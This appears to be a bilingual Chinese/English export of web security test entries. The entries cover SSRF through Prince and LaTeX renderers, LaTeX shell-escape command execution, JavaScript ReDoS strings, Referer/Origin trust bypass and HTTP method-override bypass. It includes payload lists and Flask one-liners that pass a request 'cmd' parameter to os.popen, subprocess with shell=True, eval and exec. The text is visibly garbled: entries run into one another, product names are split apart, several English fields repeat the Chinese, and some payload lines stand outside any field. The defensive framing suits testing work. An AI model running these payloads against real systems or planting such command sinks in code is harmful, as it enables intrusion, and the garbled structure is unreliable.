overview.en: The source uses Prince attachment and object references to test whether PDF generation actively retrieves a URL or embeds a local file. Link text alone is not SSRF; evidence must show that the Prince process, not the user's browser, made the request and that the resource reached output or server logs.

vulnerability.zh: 当应用允许用户控制 Prince 输入且未配置 URL 访问策略时，渲染器会继承服务端网络位置和文件权限。附件功能尤其可能把 file: 内容直接封装进 PDF；仅看到对象占位符或渲染错误不能确认读取成功。
vulnerability.en: When users control Prince input and no URL-access policy is enforced, the renderer inherits server network position and file privileges. Attachment support may package file content directly into the PDF; an object placeholder or render error does not confirm a successful read.

exploitation.zh: 步骤一用受控公共附件记录 Prince 请求特征、PDF 附件清单和哈希；步骤二回放原始 link/object 变体，关联回环模拟器、本地文件 Canary 与最终 PDF 对象；步骤三启用 URL 白名单并禁用本地文件后复测，排除客户端下载、旧 PDF 缓存或空附件造成的假阳性。
exploitation.en: First use a controlled public attachment to record Prince request traits, the PDF attachment list, and hashes. Replay the original link and object variants and correlate a loopback simulator, local-file canary, and final PDF objects. Retest with a URL allowlist and local files disabled to exclude client downloads, stale PDF cache, or empty attachments as false positives.

mitigation.zh: 只允许明确业务资源协议和域名；拒绝 file: 并在 DNS、重定向后阻断回环、链路本地与私网；在独立低权限容器中运行 Prince，使用只读临时目录并检查生成 PDF 的附件。
mitigation.en: Allow only explicit business schemes and domains. Reject file and block loopback, link-local, and private destinations after DNS and redirects. Run Prince in a separate least-privilege container with read-only temporary storage and inspect generated PDF attachments.

name.zh: LaTeX 远程资源包含 SSRF
name.en: La Te X Remote Resource Inclusion SSRF

description.zh: 用于验证服务端 LaTeX 渲染器是否会解析远程包含指令并代表应用访问受控或内部地址。
description.en: 用于验证服务端 La Te X 渲染器是否会解析远程包含指令并代表应用访问受控或内部地址。

subCategory.en: La Te X Remote Resource Inclusion

prerequisites.zh: 使用隔离 LaTeX 渲染服务，记录 TeX 引擎、允许的包含指令、代理配置和编译进程网络身份。
prerequisites.en: Use an isolated La Te X renderer and record the Te X engine, permitted inclusion directives, proxy configuration, and compiler process network identity.

prerequisites.zh: 准备带唯一请求令牌的自有 HTTP 回调与受控环回标记服务，并保留纯文本 URL 和本地文件包含对照。
prerequisites.en: Prepare an owned HTTP callback and controlled loopback marker with unique request tokens, retaining plain-text URL and local-file inclusion controls.

title.zh: SSRF

description.zh: SSRF包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: SSRF contains multiple reproducible input samples; test them individually and record response and log differences.

analysis.zh: 阳性要求渲染进程因远程包含指令主动连接受控服务，回调中的令牌、源地址与编译任务可关联；若测试内部地址，还需受控环回标记记录连接。文档里出现 URL、编译器报错、仅 DNS 查询、客户端浏览器取图、代理缓存内容或模型声称已获取都属于假阳性。
analysis.en: Positive evidence requires the renderer process to connect to the controlled service because of a remote inclusion directive, with callback token, source identity, and compile job correlated; an internal-address test additionally requires the controlled loopback marker to log the connection. A URL in the document, compiler error, DNS lookup alone, browser-side fetch, proxy-cached content, or a model claiming retrieval is a false positive.

opsecTips.zh: 首次收到一个受控 HTTP 或环回标记请求后停止，不访问云元数据、真实内网端口或系统文件。
opsecTips.en: Stop after the first controlled HTTP or loopback marker request; do not access cloud metadata, real internal ports, or system files.

opsecTips.zh: 删除测试文档和渲染缓存，关闭回调/环回服务，撤销临时出站例外并销毁编译容器。
opsecTips.en: Delete test documents and render caches, shut down callback and loopback services, revoke temporary egress exceptions, and destroy the compiler container.

title.zh: 确认渲染边界

description.zh: 定位接收 TeX 内容并在服务端完成编译的具体接口、进程与网络命名空间。
description.en: 定位接收 Te X 内容并在服务端完成编译的具体接口、进程与网络命名空间。

title.zh: 触发受控远程包含

description.zh: 向一次性回连域提交原始远程包含指令，保留请求标识与编译任务编号。
description.en: Submit the original remote inclusion directive to a one-time callback domain and retain request and compilation identifiers.

title.zh: 关联服务端证据

description.zh: 比对 DNS 日志、连接源、编译日志与输出变化，排除客户端或代理访问。
description.en: Compare DNS logs, connection source, compiler logs, and output changes while excluding client or proxy traffic.

overview.zh: 该记录不是通用 URL 字典，而是面向支持远程资源的 LaTeX 编译链。测试要区分应用下载资源、编译器解析包含指令和外部代理代取三个阶段，并以受控回连作为最低证据。
overview.en: This entry targets La Te X compilation chains that support remote resources rather than generic URL fields. Testing separates application fetching, compiler inclusion, and proxy retrieval, with a controlled callback as the minimum evidence.

vulnerability.zh: 当用户可控的 TeX 内容进入启用了网络访问的渲染器时，包含指令可能让服务端请求内网、环回或云元数据地址。只有请求确由目标发出且响应影响渲染结果时，才能确认 SSRF。
vulnerability.en: When attacker-controlled Te X reaches a renderer with network access, inclusion directives may request loopback, internal, or cloud metadata addresses. SSRF is confirmed only when the target originates the request and the response affects rendering.

exploitation.zh: 1. 先向唯一受控 HTTPS 端点发送无害包含请求并记录 DNS、连接源与时间；2. 逐项提交原始指令集合，但仅使用实验室地址观察解析差异；3. 将回连、编译日志和输出文档关联。浏览器预取、运维代理或外部扫描器产生的访问属于误报。
exploitation.en: 1. Send a harmless inclusion request to a unique controlled HTTPS endpoint and record DNS, source, and time. 2. Submit the original directive set one item at a time using laboratory addresses only. 3. Correlate callbacks, compiler logs, and the rendered document. Browser prefetches, operational proxies, and external scanners are false positives.

mitigation.zh: 1. 禁止渲染器访问网络并在隔离容器中执行编译；2. 对 TeX 语法采用允许列表并移除远程包含能力；3. 对出站流量实施域名与地址双重限制，同时阻断环回、私网和链路本地地址。
mitigation.en: 1. Disable renderer network access and compile in an isolated container. 2. Allowlist Te X syntax and remove remote inclusion features. 3. Restrict egress by both hostname and resolved address while blocking loopback, private, and link-local ranges.

name.zh: LaTeX Shell Escape 命令执行
name.en: La Te X Shell-Escape Command Execution

description.zh: 验证服务端 TeX 编译器是否错误启用 shell escape，使文档指令能够启动操作系统进程。
description.en: 验证服务端 Te X 编译器是否错误启用 shell escape，使文档指令能够启动操作系统进程。

prerequisites.zh: 在无外网、低权限、可销毁容器中固定 TeX 引擎和启动参数，明确 shell-escape、工作目录和系统调用审计。
prerequisites.en: Pin the Te X engine and launch flags in a disposable, low-privilege container without egress, documenting shell-escape, working directory, and system-call auditing.

prerequisites.zh: 以只创建随机临时标记文件的固定命令替代语料中的信息读取命令，并准备禁用 shell-escape 的同文档对照。
prerequisites.en: Replace corpus information-gathering commands with a fixed command that only creates a random temporary marker file, and retain the same document with shell-escape disabled as a control.

title.zh: RCE

description.zh: RCE包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: RCE contains multiple reproducible input samples; test them individually and record response and log differences.

analysis.zh: 阳性是编译器实际启动了受控子进程并创建唯一标记，进程、系统调用与编译任务日志形成完整因果链。TeX 源码包含 write18、PDF 回显命令文本、编译错误、模拟输出、文件由测试脚本预先创建或容器正确拒绝执行都不是 RCE。
analysis.en: Positive evidence is the compiler actually starting the controlled child process and creating the unique marker, with process, syscall, and compile-job logs forming a complete causal chain. Te X source containing write18, command text reflected in a PDF, compile errors, simulated output, a marker precreated by the harness, or correct container rejection is not RCE.

opsecTips.zh: 标记文件首次由编译子进程创建后停止，不执行 id、文件读取、网络连接或持久化命令。
opsecTips.en: Stop after the marker file is first created by the compiler child process; do not execute identity, file-read, network, or persistence commands.

opsecTips.zh: 终止编译进程，删除文档、标记和输出文件，清理审计记录并销毁容器，恢复 shell-escape 禁用。
opsecTips.en: Terminate compiler processes, delete documents, markers, and output files, clear audit records, destroy the container, and restore disabled shell-escape.

title.zh: 记录安全编译基线

description.zh: 确认编译器参数中未启用外部命令能力，并采集正常任务的进程树与文件写入。
description.en: Confirm external-command features are disabled and collect the normal job's process tree and file writes.

title.zh: 提交无害执行标记

description.zh: 使用原始指令中的最小测试变体创建随机标记，不读取系统文件也不建立外连。
description.en: Use the smallest original directive variant to create a random marker without reading system files or opening connections.

title.zh: 验证编译器子进程

description.zh: 将标记文件、服务账号、父子进程关系和任务标识关联，确认副作用来自服务端。
description.en: 将标记文件、服务账号、父子进程关系和任务标识关联，确认副作用来自服务端。

overview.zh: 该记录针对 TeX 的写出执行能力，不应作为普通业务逻辑案例展示。评估应先确认编译引擎、启动参数、工作目录与容器边界，再使用无害标记观察子进程是否由编译器创建。
overview.en: This entry concerns Te X write-and-execute capability rather than business logic. Assessment first identifies the engine, launch flags, working directory, and container boundary, then uses a harmless marker to observe compiler-created processes.

vulnerability.zh: 若渲染服务以启用 shell escape 的方式编译不可信文档，攻击者可让编译进程执行系统命令，并继承服务账号的文件与网络权限。仅出现 TeX 语法错误或命令字符串回显不代表执行成功。
vulnerability.en: If a rendering service compiles untrusted documents with shell escape enabled, an attacker can execute system commands with the service account's file and network privileges. A Te X error or reflected command string does not prove execution.

exploitation.zh: 1. 在隔离环境建立正常文档编译基线并记录进程树；2. 从原始集合选择只创建随机标记文件的测试项，逐次提交且不访问敏感数据；3. 核对文件所有者、编译任务和子进程审计。只有服务器侧副作用与任务一致时才确认，客户端生成文件属于误报。
exploitation.en: 1. 在隔离环境建立正常文档编译基线并记录进程树；2. 从原始集合选择只创建随机标记文件的测试项，逐次提交且不访问敏感数据；3. 核对文件所有者、编译任务和子进程审计。只有服务器侧副作用与任务一致时才确认，客户端生成文件属于误报。

mitigation.zh: 1. 永久关闭 shell escape 与同类外部执行选项；2. 在无特权、只读文件系统和无网络容器中运行编译器；3. 对宏包和控制序列建立允许列表，并限制 CPU、内存、进程数与执行时间。
mitigation.en: 1. Permanently disable shell escape and equivalent external-execution options. 2. Run the compiler unprivileged in a read-only, networkless container. 3. Allowlist packages and control sequences and limit CPU, memory, processes, and execution time.

name.zh: JavaScript 正则表达式拒绝服务
name.en: Java Script Regular Expression Denial of Service

description.zh: 以渐增长度的近似匹配字符串验证 JavaScript 正则是否发生灾难性回溯，并用事件循环延迟作为证据。
description.en: Uses near-matching strings of increasing length to test Java Script regular expressions for catastrophic backtracking, with event-loop delay as evidence.

subCategory.en: Java Script Re Do S Inputs

prerequisites.zh: 确定触发输入的具体 JavaScript 正则、运行时版本和调用路径，在独立 worker 中限制 CPU、内存与最长执行时间。
prerequisites.en: Identify the exact Java Script regex, runtime version, and call path reached by input, using an isolated worker with CPU, memory, and execution-time limits.

prerequisites.zh: 从短失败匹配开始递增长度，交错运行安全正则、成功匹配和随机后缀对照，采集事件循环延迟与 CPU。
prerequisites.en: Start with short failing matches and increase length, interleaving safe-regex, successful-match, and random-suffix controls while collecting event-loop delay and CPU.

title.zh: JavaScript ReDoS

execution.command:
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaX
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa1
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa@
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa#
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\t
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n

description.zh: JavaScript ReDoS包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: Java Script Re Do S contains multiple reproducible input samples; test them individually and record response and log differences.

analysis.zh: 阳性要求失败匹配时长随输入长度呈可重复的超线性或指数增长，并能定位到同一正则的回溯和事件循环阻塞。单次超时、冷启动、GC、其他请求负载、网络延迟、固定长度字符串较慢或异常处理开销都属于假阳性边界。
analysis.en: Positive evidence requires reproducible superlinear or exponential failed-match growth with input length, localized to backtracking in the same regex and event-loop blocking. One timeout, cold start, garbage collection, other request load, network latency, one slower fixed-length string, or exception-handling overhead is a false-positive boundary.

opsecTips.zh: 增长曲线达到预设 CPU/时延阈值后停止，不发送语料最大长度或并发放大请求。
opsecTips.en: Stop when the growth curve reaches the predefined CPU or latency threshold; do not send the corpus maximum or concurrent amplification requests.

opsecTips.zh: 终止测试 worker，清除队列和性能 trace，恢复资源限制并替换或约束风险正则。
opsecTips.en: Terminate the test worker, clear queues and performance traces, restore resource limits, and replace or constrain the risky regex.

title.zh: 定位具体正则调用

description.zh: 从接口到代码路径确认待测表达式、失败匹配条件以及是否运行在主线程。
description.en: Trace the endpoint to the exact expression, failed-match condition, and whether execution occurs on the main thread.

title.zh: 递增输入并限时

description.zh: 按长度顺序提交原始近似匹配字符串，每次记录独立计时并在阈值前停止。
description.en: Submit original near-matching strings in length order, recording isolated timings and stopping before the threshold.

attackChain.payload:
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaX
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa1
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa@
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa#
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\t
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n

title.zh: 绘制资源增长曲线

description.zh: 关联匹配时延、CPU、事件循环延迟和队列长度，判断是否存在超线性增长。
description.en: 关联匹配时延、CPU、事件循环延迟和队列长度，判断是否存在超线性增长。

overview.zh: 该集合是 JavaScript 正则引擎的对抗输入，不是业务流程绕过。测试应围绕具体正则、输入长度和事件循环阻塞建立增长曲线，避免一次超长请求直接拖垮共享环境。
overview.en: This collection contains adversarial inputs for Java Script regex engines rather than business-flow bypasses. Testing builds a growth curve for a specific regex, input length, and event-loop blocking without sending one oversized request to shared infrastructure.

vulnerability.zh: 包含重叠量词或歧义分支的正则在失败匹配时可能出现指数级回溯，使单个请求长时间占用 Node.js 主线程。仅看到高延迟但没有随长度增长的可重复曲线，不能确认 ReDoS。
vulnerability.en: Regexes with overlapping quantifiers or ambiguous alternation can backtrack exponentially on failed matches and occupy the Node.js main thread. High latency without a reproducible input-length growth curve does not confirm Re Do S.

exploitation.zh: 1. 在隔离副本上记录正常输入的匹配时间与事件循环延迟；2. 从原始字符串中按长度递增逐个测试，并设置严格超时；3. 重复采样后比较增长率、CPU 和请求队列。网络抖动、冷启动或下游慢查询造成的延迟应判为误报。
exploitation.en: 1. Record match time and event-loop delay for normal input on an isolated replica. 2. Test original strings one at a time in increasing length with a strict timeout. 3. Repeat samples and compare growth rate, CPU, and request queueing. Network jitter, cold starts, and slow downstream queries are false positives.

mitigation.zh: 1. 重写存在嵌套量词或重叠分支的表达式并采用线性时间引擎；2. 限制输入长度和正则执行时间；3. 把高风险匹配移出主线程，并为延迟斜率与事件循环阻塞建立回归测试。
mitigation.en: 1. Rewrite expressions with nested quantifiers or overlapping alternatives and prefer a linear-time engine. 2. Limit input length and regex execution time. 3. Move risky matching off the main thread and add regression tests for latency slope and event-loop blocking.

name.zh: Referer/Origin 信任绕过

description.zh: 验证服务端是否把可伪造的 Referer 或 Origin 当作访问管理资源的授权依据。
description.en: Tests whether a server treats forgeable Referer or Origin headers as authorization for administrative resources.

prerequisites.zh: 准备未认证、普通用户和管理员三类合成主体，并为同一只读管理 canary 记录正常授权基线。
prerequisites.en: Prepare unauthenticated, regular-user, and administrator synthetic principals and record the normal authorization baseline for one read-only administration canary.

prerequisites.zh: 固定路径、方法、Cookie 与代理链，只改变 Referer 或 Origin，并记录边缘与应用最终看到的 Header 和主体。
prerequisites.en: Fix path, method, cookie, and proxy chain while changing only Referer or Origin, recording headers and principal as seen by the edge and application.

Origin: http://[::1]

description.zh: Referer/Origin包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: Referer/Origin contains multiple reproducible input samples; test them individually and record response and log differences.

analysis.zh: 阳性要求无权限主体仅因伪造为环回/可信来源的 Header 而读取管理 canary，服务端授权日志显示该 Header 是决定因素。Header 被接收、风险分数变化、返回登录页/缓存模板、CORS 允许公开响应、原主体本有权限或状态码改变但对象未返回都属于假阳性。
analysis.en: Positive evidence requires an unauthorized principal to read the administration canary solely because a header is forged as loopback or trusted, with server authorization logs showing that header as decisive. Header acceptance, risk-score changes, a login or cached template, CORS access to public content, a principal already authorized, or status change without the object is a false positive.

opsecTips.zh: 一个无敏感字段的 canary 首次因来源 Header 被放行后停止，不访问写接口或真实管理数据。
opsecTips.en: Stop after one canary without sensitive fields is first allowed by a source header; do not access write endpoints or real administration data.

opsecTips.zh: 删除合成主体和 canary，清除代理/授权调试日志与缓存，并恢复基于会话和对象的服务端授权。
opsecTips.en: Delete synthetic principals and the canary, clear proxy and authorization debug logs and caches, and restore session- and object-based server authorization.

title.zh: 建立来源头授权边界基线
title.en: Establish the Source-Header Authorization Boundary baseline

description.zh: 使用低权限账号分别记录无来源头与正常外部来源头访问管理路径的拒绝结果，并保存原始请求、响应与服务端关联标识。
description.en: Record denied access to the administrative path for a low-privilege account with no source header and with a normal external source, retaining raw requests, responses, and server correlation identifiers.

title.zh: 执行来源头授权边界变体
title.en: Execute the Source-Header Authorization Boundary variants

description.zh: 逐项提交原始 Referer/Origin 行，每次只改变一个头并保持身份、方法和路径不变，严格保持其他变量不变并设置停止阈值。
description.en: Submit original Referer or Origin lines one at a time while keeping identity, method, and path unchanged, holding all other variables constant and defining a stop threshold.

title.zh: 核验Referer/Origin 信任绕过证据
title.en: Verify evidence for Referer and Origin Trust Bypass

description.zh: 通过服务端主体、授权决策和资源内容确认伪造头是否真正改变权限；同时排除状态码变化、CSRF 拒绝页面或公开资源响应。
description.en: Confirm from server principal, authorization decision, and resource content whether the forged header changes privileges; also exclude Status-code changes, CSRF denial pages, or public-resource responses.

overview.zh: 该集合以本地、内网和可信名称构造 Referer/Origin，目标是比较代理与应用对来源头的解释。本条按HTTP 授权与路由边界审查；应在隔离资源上逐项执行，固定身份、路径、方法和除当前变量外的所有请求条件。
overview.en: The set supplies loopback, internal, and trusted names in Referer and Origin to compare proxy and application interpretation. This entry is reviewed as a HTTP authorization and routing boundary; Execute one item at a time against an isolated resource while fixing identity, path, method, and every request condition except the tested variable.

vulnerability.zh: 若敏感路由仅依据这些客户端可控头判断“内部请求”，外部用户即可伪造来源并获得额外权限。确认标准是通过服务端主体、授权决策和资源内容确认伪造头是否真正改变权限；状态码变化、CSRF 拒绝页面或公开资源响应不能作为漏洞证据。
vulnerability.en: If a sensitive route identifies internal requests solely from these client-controlled headers, an external user can forge the source and gain privileges. Confirmation requires Confirm from server principal, authorization decision, and resource content whether the forged header changes privileges; Status-code changes, CSRF denial pages, or public-resource responses is not vulnerability evidence.

exploitation.zh: 1. 使用低权限账号分别记录无来源头与正常外部来源头访问管理路径的拒绝结果；2. 逐项提交原始 Referer/Origin 行，每次只改变一个头并保持身份、方法和路径不变；3. 通过服务端主体、授权决策和资源内容确认伪造头是否真正改变权限。状态码变化、CSRF 拒绝页面或公开资源响应应记录为误报。
exploitation.en: 1. Record denied access to the administrative path for a low-privilege account with no source header and with a normal external source. 2. Submit original Referer or Origin lines one at a time while keeping identity, method, and path unchanged. 3. Confirm from server principal, authorization decision, and resource content whether the forged header changes privileges. Treat Status-code changes, CSRF denial pages, or public-resource responses as false positives.

mitigation.zh: 1. 所有敏感资源基于经过认证的主体和服务端权限表授权；2. 仅在受信代理清洗并重建后使用来源相关头做辅助判断；3. 为缺失、伪造和多值 Origin/Referer 建立负向测试与日志。
mitigation.en: 1. 所有敏感资源基于经过认证的主体和服务端权限表授权；2. 仅在受信代理清洗并重建后使用来源相关头做辅助判断；3. 为缺失、伪造和多值 Origin/Referer 建立负向测试与日志。

name.zh: HTTP 方法覆盖头授权绕过

description.zh: 检查代理与应用是否对 X-HTTP-Method-Override 等头采用不同方法，并遗漏最终方法的授权。
description.en: Checks whether proxies and applications derive different methods from override headers and omit authorization for the effective method.

prerequisites.zh: 在测试 API 为 GET/POST 与 PUT/PATCH/DELETE 建立明确授权和 CSRF 矩阵，只使用可回滚 canary 对象。
prerequisites.en: Define an explicit authorization and CSRF matrix for GET or POST versus PUT, PATCH, and DELETE in a test API, using only a reversible canary object.

prerequisites.zh: 记录代理检查的外层方法、各 override Header、框架有效方法和最终处理器，每次只发送一个覆盖头。
prerequisites.en: Record the outer method checked by the proxy, each override header, framework-effective method, and final handler, sending only one override header per request.

title.zh: X-HTTP-Method-Override

execution.command:

X-HTTP-Method-Override: DELETE
X-HTTP-Method-Override: PUT
X-HTTP-Method-Override: PATCH
X-HTTP-Method-Override: TRACE

X-Method-Override: PUT
X-Method-Override: PATCH
X-Method-Override: TRACE
X-Method-Override: OPTIONS
X-Method-Override: CONNECT
X-Method-Override: PROPFIND
X-Method-Override: MOVE
X-Method-Override: COPY

description.zh: X-HTTP-Method-Override包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: X-HTTP-Method-Override contains multiple reproducible input samples; test them individually and record response and log differences.

analysis.zh: 阳性是边缘按允许的外层方法放行，而应用采用受限覆盖方法并在无相应授权/CSRF 的情况下改变 canary，双层日志可关联。返回 Allow Header、405/501、路由存在、框架解析覆盖值但随后授权拒绝、仅响应正文写 DELETE 或无状态变化都不是方法绕过。
analysis.en: Positive evidence is the edge allowing the outer method while the application applies a restricted override method and changes the canary without the corresponding authorization or CSRF check, correlated across both tiers. An Allow header, HTTP 405 or 501, route existence, parsing followed by authorization denial, DELETE text in a response, or no state change is not method bypass.

opsecTips.zh: 一个可回滚 canary 首次由覆盖方法改变后停止，不测试真实删除、上传或管理处理器。
opsecTips.en: Stop after one reversible canary is first changed by an override method; do not test real deletion, upload, or administration handlers.

opsecTips.zh: 回滚 canary，删除测试会话和 override trace，并恢复边缘与应用统一方法解析、授权和 CSRF。
opsecTips.en: Roll back the canary, delete test sessions and override traces, and restore consistent method parsing, authorization, and CSRF at edge and application.

title.zh: 建立方法覆盖头基线

description.zh: 以低权限身份对同一路径分别发送正常 GET、POST 和受限目标方法并记录拒绝基线，并保存原始请求、响应与服务端关联标识。
description.en: Send normal GET, POST, and the restricted target method to the same path as a low-privilege user and record denials, retaining raw requests, responses, and server correlation identifiers.

title.zh: 执行方法覆盖头变体

description.zh: 逐项加入原始方法覆盖头，只改变头名或值并记录各层识别出的有效方法，严格保持其他变量不变并设置停止阈值。
description.en: Add original method-override headers one at a time, changing only header name or value and recording each layer's effective method, holding all other variables constant and defining a stop threshold.

X-HTTP-Method: DELETE

X-HTTP-Method-Override: PROPFIND
X-HTTP-Method-Override: MOVE
X-HTTP-Method-Override: COPY
X-Method-Override: DELETE
X-Method-Override: PUT
X-Method-Override: PATCH

X-Method-Override: MOVE
X-Method-Override: COPY

title.zh: 核验HTTP 方法覆盖头授权绕过证据
title.en: Verify evidence for HTTP Method-Override Authorization Bypass

description.zh: 核对应用路由、审计日志和最终资源状态，确认受限方法确已执行；同时排除OPTIONS 自动响应、405 页面差异或代理回显覆盖头。
description.en: Verify application routing, audit logs, and final resource state to confirm that the restricted method executed; also exclude Automatic OPTIONS responses, 405-page differences, or proxy reflection of the override header.

overview.zh: 原始集合覆盖多种方法覆盖头和危险动词，核心是前置层检查的外层方法与应用执行的有效方法是否一致。本条按HTTP 授权与路由边界审查；应在隔离资源上逐项执行，固定身份、路径、方法和除当前变量外的所有请求条件。
overview.en: The original set covers several override headers and sensitive verbs, focusing on consistency between the edge-checked method and the application-effective method. This entry is reviewed as a HTTP authorization and routing boundary; Execute one item at a time against an isolated resource while fixing identity, path, method, and every request condition except the tested variable.

vulnerability.zh: 如果网关按 POST 放行而应用按 DELETE、PUT 或 WebDAV 方法执行，方法级授权和 CSRF 控制可能被绕过。确认标准是核对应用路由、审计日志和最终资源状态，确认受限方法确已执行；OPTIONS 自动响应、405 页面差异或代理回显覆盖头不能作为漏洞证据。
vulnerability.en: If a gateway permits POST while the application executes DELETE, PUT, or a Web DAV verb, method-level authorization and CSRF controls may be bypassed. Confirmation requires Verify application routing, audit logs, and final resource state to confirm that the restricted method executed; Automatic OPTIONS responses, 405-page differences, or proxy reflection of the override header is not vulnerability evidence.

exploitation.zh: 1. 以低权限身份对同一路径分别发送正常 GET、POST 和受限目标方法并记录拒绝基线；2. 逐项加入原始方法覆盖头，只改变头名或值并记录各层识别出的有效方法；3. 核对应用路由、审计日志和最终资源状态，确认受限方法确已执行。OPTIONS 自动响应、405 页面差异或代理回显覆盖头应记录为误报。
exploitation.en: 1. Send normal GET, POST, and the restricted target method to the same path as a low-privilege user and record denials. 2. Add original method-override headers one at a time, changing only header name or value and recording each layer's effective method. 3. Verify application routing, audit logs, and final resource state to confirm that the restricted method executed. Treat Automatic OPTIONS responses, 405-page differences, or proxy reflection of the override header as false positives.

mitigation.zh: 1. 在边缘和应用统一解析有效方法，并默认禁用方法覆盖；2. 按最终有效方法执行认证、授权、CSRF 和审计；3. 明确允许的动词集合并拒绝重复或冲突的覆盖头。
mitigation.en: 1. Resolve the effective method consistently at edge and application and disable overrides by default. 2. Apply authentication, authorization, CSRF, and auditing to the final effective method. 3. Allowlist verbs and reject duplicate or conflicting override headers.

name.zh: Flask 请求参数命令执行片段

description.zh: 覆盖 request.args、form 与 values 进入 os、subprocess、eval 或 exec 的 Flask 代码片段，用于确认 HTTP 参数是否跨入 Python 执行边界。
description.en: Covers Flask snippets where request args, forms, or values reach os, subprocess, eval, or exec, testing whether HTTP parameters cross into Python execution.

prerequisites.zh: 已在授权隔离环境定位“Flask 请求参数命令执行片段”的真实输入点、处理器和运行时版本，并确认：视图、模板扩展或调试辅助代码从 request 对象读取未受约束的 cmd 参数并进入 os.popen、os.system、subprocess、eval 或 exec。
prerequisites.en: The authorized isolated environment identifies the real input, handler, and runtime version for Flask Request-Parameter Command Execution Snippets, confirming that a view, template extension, or debugging helper reads an unconstrained cmd parameter from request and passes it to os.popen, os.system, subprocess, eval, or exec.

prerequisites.zh: 测试 worker 可随时销毁，并能同时观察一次性固定标记的标准输出、对应服务进程日志和同一请求 ID 能够相互关联。
prerequisites.en: The test worker is disposable and can observe stdout from a one-time fixed marker, the corresponding service-process log, and the same request identifier correlate.

title.zh: Flask

description.zh: Flask包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: Flask contains multiple reproducible input samples; test them individually and record response and log differences.

analysis.zh: 阳性要求可控输入连续到达危险运行时 API，并取得一次性固定标记的标准输出、对应服务进程日志和同一请求 ID 能够相互关联。代码片段、语法错误、HTTP 200、参数回显，或在已有本地 Shell 中手工运行命令均属假阳性或前置能力，不能证明“Flask 请求参数是否被直接传给系统命令、Shell 子进程或 Python 动态求值函数”。
analysis.en: A positive requires a continuous path from controllable input to a dangerous runtime API plus stdout from a one-time fixed marker, the corresponding service-process log, and the same request identifier correlate. Snippets, syntax errors, HTTP 200, reflection, or manual commands after an existing shell are false positives or prerequisites and do not prove whether Flask request parameters are passed directly to operating-system commands, shell subprocesses, or Python dynamic evaluation.

opsecTips.zh: Flask 请求参数命令执行片段停止条件：“Flask 请求参数命令执行片段”只允许使用一次性固定标记；出现非预期子进程、外部网络、文件写入或权限变化时，立即终止 worker 并停止测试。 本条重点观察“Flask 请求参数是否被直接传给系统命令、Shell 子进程或 Python 动态求值函数”。
opsecTips.en: Flask Request-Parameter Command Execution Snippets stop condition: Use only a one-time fixed marker for Flask Request-Parameter Command Execution Snippets; terminate the worker and stop on unexpected child processes, external network, writes, or privilege changes. The entry-specific focus is whether Flask request parameters are passed directly to operating-system commands, shell subprocesses, or Python dynamic evaluation.

opsecTips.zh: Flask 请求参数命令执行片段清理条件：结束后删除标记与临时脚本，关闭全部子进程，重建 worker，并确认日志未残留凭据、命令输出或业务数据。 清理完成后再次确认该技术路径没有残留可触发状态。
opsecTips.en: Flask Request-Parameter Command Execution Snippets cleanup condition: Remove markers and temporary scripts, terminate child processes, rebuild the worker, and verify logs contain no credentials, command output, or business data. Recheck that no triggerable state remains for this technique.

title.zh: 确认“Flask 请求参数命令执行片段”执行入口
title.en: Confirm the Flask Request-Parameter Command Execution Snippets execution entry

description.zh: 定位真实输入、处理器与最终 API，核对前提“视图、模板扩展或调试辅助代码从 request 对象读取未受约束的 cmd 参数并进入 os.popen、os.system、subprocess、eval 或 exec”，并记录运行时版本和服务身份。
description.en: Locate the real input, handler, and final API, confirm that a view, template extension, or debugging helper reads an unconstrained cmd parameter from request and passes it to os.popen, os.system, subprocess, eval, or exec, and record runtime version and service identity.

title.zh: 建立“Flask 请求到命令执行”安全基线
title.en: Establish the Flask Request-to-Command Execution baseline

description.zh: 使用普通参数或固定业务操作保存正常响应、进程和文件行为，并采用“一次性固定标记的标准输出、对应服务进程日志和同一请求 ID 能够相互关联”作为异常证据。
description.en: Use normal parameters or a fixed business operation to record response, process, and file behavior, accepting stdout from a one-time fixed marker, the corresponding service-process log, and the same request identifier correlate as abnormal evidence.

title.zh: 逐行验证“Flask 请求参数命令执行片段”
title.en: Validate Flask Request-Parameter Command Execution Snippets line by line

description.zh: 测试步骤为：先以缺少 cmd 和普通文本参数建立错误处理基线，再逐个绑定真实 request 来源与原代码片段，使用无副作用固定标记确认调用路径。每轮只替换一行，所有命令、路径与网络地址均改为隔离的无害标记。
description.en: establish missing-cmd and plain-text error baselines, then bind each original snippet to the real request source and use a side-effect-free fixed marker to confirm the call path. Replace one line per run and substitute every command, path, and network destination with an isolated harmless marker.

attackChain.payload:
__import__('os').popen(request.args.get('cmd')).read()
__import__('os').popen(request.form.get('cmd')).read()
__import__('os').popen(request.values.get('cmd')).read()
__import__('os').popen(request.args['cmd']).read()
__import__('os').popen(request.form['cmd']).read()
__import__('os').system(request.args.get('cmd'))
__import__('os').system(request.form.get('cmd'))
__import__('subprocess').check_output(request.args.get('cmd'),shell=True)
__import__('subprocess').check_output(request.form.get('cmd'),shell=True)
__import__('subprocess').getoutput(request.args.get('cmd'))
__import__('subprocess').getoutput(request.form.get('cmd'))
eval(request.args.get('cmd'))
eval(request.form.get('cmd'))
exec(request.args.get('cmd'))
exec(request.form.get('cmd'))

title.zh: 修复运行时边界并回归
title.en: Remediate and regress the runtime boundary

